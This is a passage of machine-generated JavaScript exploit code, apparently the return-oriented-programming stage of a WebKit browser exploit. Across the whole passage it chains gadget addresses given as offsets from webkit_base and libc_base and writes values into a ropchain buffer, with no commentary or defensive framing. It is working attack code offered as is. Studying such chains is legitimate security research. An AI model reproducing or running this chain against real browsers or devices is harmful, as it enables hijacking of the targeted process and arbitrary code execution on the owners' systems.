webkit_base+865136, 
libc_base+793877, 
ropchain+332128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332560, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332848, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332920, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+333128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+333296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+333328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+333280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+333432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+333416, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965180, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967260, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+333576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+333744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+333776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+333760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+333728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+333880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+333864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965184, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+333960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965208, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+334032, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965188, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+334112, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965164, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+334240, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+222888, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+397928, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+334384, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([66, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+334504, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+334608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+334624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+334776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+334808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+334792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+334760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+334904, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+334888, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+335008, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+185976, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+335080, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+335248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+335384, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+335440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+335488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+335592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+335608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+335760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+335792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+335776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+335744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+335864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+335880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+335976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+335960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+336056, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([512, 0]); 
set_gadget(libc_base+788575,); 
db([512, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+336208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336224, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+336192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+336392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+336376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+336512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+336560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+336528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+336672, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+336664, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+336688, 
ropchain+336704, 
libc_base+811575, 
ropchain+336720, 
libc_base+811575, 
ropchain+340608, 
libc_base+759626, 
libc_base+793877, 
ropchain+336776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+336856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+336912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+336992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+337096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+337264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+337248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+337456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+337424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+337408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+337528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337544, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+337632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+337688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+337808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+337840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+337824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+337992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+338008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+337976, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338208, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+338312, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172824, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+338448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+338432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+338640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([66, 0]); 
set_gadget(libc_base+788575,); 
db([66, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+338792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+338776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+269973, 
libc_base+793877, 
ropchain+338968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+338984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+338952, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+339104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+339248, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+339240, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+339264, 
ropchain+339888, 
libc_base+793877, 
ropchain+339304, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+339408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+339424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+339576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+339592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+339560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339680, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+339696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+339800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+339784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+339880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+339928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+340200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+340232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+340184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+340328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+340312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+340416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340472, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965156, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+340552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+335448, 
libc_base+793877, 
ropchain+340648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+340752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+340920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+340952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+340936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+340904, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+341032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397944, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+341200, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+341272, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+341376, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+341392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+341544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+341576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+341560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+341528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341648, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+341664, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+341744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+341840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+341992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+341976, 
webkit_base+7438103, 
libc_base+206806 
]);
